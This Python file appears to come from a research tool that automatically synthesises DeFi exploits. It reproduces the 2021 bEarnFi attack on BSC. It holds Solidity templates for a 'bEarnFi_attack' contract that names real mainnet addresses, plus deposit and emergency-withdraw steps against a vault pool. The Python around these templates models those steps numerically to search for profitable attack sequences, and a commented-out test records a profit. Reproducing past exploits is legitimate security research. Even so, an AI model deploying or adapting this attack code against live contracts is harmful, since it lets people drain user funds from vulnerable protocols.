import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))

from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *


class bEarnFiAction():

    initialStates = [95953530, 111624959, 0]
        #  [0]: BvaultsStrategy.sharesTotal(); 
        #  [1]: BvaultsStrategy.wantLockedTotal();
        #  [2]: locked 

    globalStates = initialStates.copy()

    startStr_contract  = """// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/bEarnFiI.sol";
//Timestamp  2021-05-16 10:36:20(UTC)
//Block number 7457125
//Gas limit  23316833
//Gas used  14297158
//tx: 0x603b2bbe2a7d0877b22531735ff686a7caad866f6c0435c37b7b49e4bfd9a36c
 

contract bEarnFi_attack {
    address private EOA;
    address private crBUSDAddress = 0x2Bc4eb013DDee29D37920938B96d353171289B7C;
    address private BUSDAddress = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private PancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private ProxyAddress = 0xB390B07fcF76678089cb12d8E615d5Fe494b01Fb;
    address private FairlaunchAddress = 0xA625AB01B08ce023B2a342Dbb12a16f2C8489A8F;
    address private ibBUSDAddress = 0x7C9e73d4C71dae564d41F78d56439bB4ba87592f;
    address private BvaultsStrategyAddress = 0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e;

    IBvaultsStrategy BvaultsStrategy = IBvaultsStrategy(BvaultsStrategyAddress);

    IBEP20 BUSD = IBEP20(BUSDAddress);
    IBvaultsbank Bvaultsbank = IBvaultsbank(ProxyAddress);
    IBEP20 ibBUSD = IBEP20(ibBUSDAddress);
    IFairlaunch Fairlaunch = IFairlaunch(FairlaunchAddress);
    string str1 = "";
    string str2 = "";
    string str3 = "";

    string str89 = "";
    string str90 = "";
    string str91 = "";


    constructor() payable {
        BUSD.approve(ProxyAddress, 2**256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}
"""

    startStr_attack = """
    // loan amount = 7,804,239,111,784,605,253,208,534 BUSD
    function attack( $$_$$ ) public {

"""
    
    endStr_attack = """
        revert(ProfitSummary());
    }
"""

    endStr_contract = """
    function BvaultsSummary() internal returns (string memory _uintAsString) {
        uint sharesTotal = BvaultsStrategy.sharesTotal() / 1e18; 
        uint wantLockedTotal = BvaultsStrategy.wantLockedTotal() / 1e18; 
        uint locked = BUSD.balanceOf(BvaultsStrategyAddress) / 1e18; 
        str89 = append("sharesTotal: ", uint2str(sharesTotal));
        str90 = append("wantLockedTotal: ", uint2str(wantLockedTotal));
        str91 = append("locked: ", uint2str(locked));
        return appendWithSpace(appendWithSpace(str89, str90), str91);
    } 

    function ProfitSummary() internal returns (string memory _uintAsString) {
        uint balance = BUSD.balanceOf(address(this)) / 1e18;
        return append("BUSD balance: ", uint2str(balance));
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }     

}

                """
    
    initialBalances = {"bUSD": 7804239}
    currentBalances = {"bUSD": 7804239}
    TargetTokens = {'bUSD'}
    TokenPrices = {'bUSD': 1.0}

    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1 or stats[0] == 20:
            return 0
        profit = stats[0] - 7804239
        return profit
        

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)


    def initialPass():
        action1 = Deposit
        action2 = EmergencyWithdraw
        action_list_1 = [action1, action2]

        action1_prestate_dependency = [action1, action2]
        action2_prestate_dependency = [action1, action2]
        
        # seq of actions
        ActionWrapper = bEarnFiAction
        action_lists = [action1_prestate_dependency + [action1], \
            action2_prestate_dependency + [action2]]

        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return



class Deposit(bEarnFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None
    
    numInputs = 1
    tokensIn = ['bUSD']
    tokensOut = ['Share']
    range = [0, 10000000]  # 780 0000

    @classmethod
    def actionStr(cls):
        action = "      // Action: Deposit\n"
        action += '''       Bvaultsbank.deposit(13, $$ * 10 ** 18);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: Deposit\n"
        action += '''                str1 = BvaultsSummary();
        (uint sharesPre,) = Bvaultsbank.userInfo(13, address(this));
        
        Bvaultsbank.deposit(13, $$ * 1e18);
        
        (uint sharesPost,) = Bvaultsbank.userInfo(13, address(this));
        str2 = BvaultsSummary();
        uint SharesGot = (sharesPost - sharesPre) / 1e18;
        revert(appendWithSpace(appendWithSpace(str1, str2), uint2str(SharesGot)));\n'''
        return action     


    @classmethod
    def aliquotValues(cls, values):
        return values[3], values[4], values[5], values[6] 

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 7:
            return -1
        point = [values[0], values[1], values[2], inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)   # Uniswap DAI reserve

        v0, v1, v2, v3 = cls.aliquotValues(values)
        cls.values[0].append(v0)  
        cls.values[1].append(v1)
        cls.values[2].append(v2)
        cls.values[3].append(v3)

        cls.hasNewDataPoints = True

        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        
        return output0, output1, output2, output3

    @classmethod
    def transit(cls, input): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
            
        cls.currentBalances['bUSD'] -= input
        output0, output1, output2, output3 = cls.simulate(input)
        
        cls.globalStates[0] = output0
        cls.globalStates[1] =  cls.globalStates[1] + input + cls.globalStates[2] 
        cls.globalStates[2] = 0

        if "Share" not in cls.currentBalances:
            cls.currentBalances["Share"] = output3
        else:
            cls.currentBalances["Share"] += output3


    @classmethod
    def string(cls):
        return cls.__name__





class EmergencyWithdraw(bEarnFiAction):
    points = []
    values = [[], [], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None
    approximator3 = None

    numInputs = 0
    tokensIn = ['Share']
    tokensOut = ['bUSD']
    range = [] 

    @classmethod
    def actionStr(cls):
        action = "      // Action: EmergencyWithdraw\n"
        action += '''      Bvaultsbank.emergencyWithdraw(13);\n'''
        return action


    @classmethod
    def collectorStr(cls):
        action = "      // Collect: EmergencyWithdraw\n"
        action += '''        str1 = BvaultsSummary();
        uint BUSDgot = BUSD.balanceOf(address(this));
        (uint sharesSpent,) = Bvaultsbank.userInfo(13, address(this));

        Bvaultsbank.emergencyWithdraw(13);

        BUSDgot = ( BUSD.balanceOf(address(this)) - BUSDgot ) / 1e18;
        str2 = BvaultsSummary();
        revert(appendWithSpace(appendWithSpace(str1, uint2str(sharesSpent / 1e18)), appendWithSpace( str2, uint2str(BUSDgot))));
        
        '''
        return action


    @classmethod
    def aliquotValues(cls, values):
        return values[4], values[5], values[6], values[7] 

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 8:
            return -1
        point = [values[0], values[1], values[2], values[3]]

        if point in cls.points:
            return -2

        cls.points.append(point) 

        v0, v1, v2, v3 = cls.aliquotValues(values)

        cls.values[0].append(v0)
        cls.values[1].append(v1)
        cls.values[2].append(v2)
        cls.values[3].append(v3)

        cls.hasNewDataPoints = True
        return 1


    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.approximator3 = NumericalApproximator(cls.points, cls.values[3])
        cls.hasNewDataPoints = False


    @classmethod
    def simulate(cls):

        inputs = [cls.globalStates[0], cls.globalStates[1], cls.globalStates[2], cls.currentBalances['Share']]

        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        output3 = cls.approximator3(inputs)
        
        return output0, output1, output2, output3
        

    @classmethod
    def transit(cls): # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        output0, output1, output2, output3  = cls.simulate()

        cls.globalStates[0] -= cls.currentBalances['Share'] 
        
        cls.currentBalances['Share'] = 0

        cls.globalStates[1] = output1
        cls.globalStates[2] = output2

        cls.currentBalances['bUSD'] += output3

    @classmethod
    def string(cls):
        return cls.__name__



def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.contract_name = "bEarnFi_attack"
    config.initialEther = 14000
    config.blockNum = 7457125
    config.ETHorBSCorDVDorFantom = 1

# Test for initial pass of data collecton: 
    bEarnFiAction.initialPass()

#     bEarnFiAction.runinitialPass()

# Test for correct sequence of actions and correct sequence of parameters

    # initial_guess = [7804238, 7804238]

    # action1 = Deposit
    # action2 = EmergencyWithdraw
    # action_list = [action1, action2, action1, action2]
    # ActionWrapper = bEarnFiAction


    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))
#     actual_profit = 13838
#     print("actual profit: ", actual_profit)
#     e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
#     return actual_profit, e1, e2, e3, e4


if __name__ == '__main__':
    main()